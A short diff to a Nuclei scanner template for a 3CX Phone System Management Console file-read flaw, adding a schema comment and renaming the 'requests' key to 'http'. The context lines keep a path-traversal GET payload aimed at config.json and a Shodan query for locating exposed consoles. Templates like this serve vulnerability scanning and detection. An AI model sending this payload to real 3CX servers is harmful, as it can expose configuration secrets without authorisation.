@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: 3cx-management-console
 
 info:
@@ -15,7 +16,7 @@ info:
     shoda-query: http.title:"3CX Phone System Management Console"
   tags: 3cx,lfi,voip
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json'
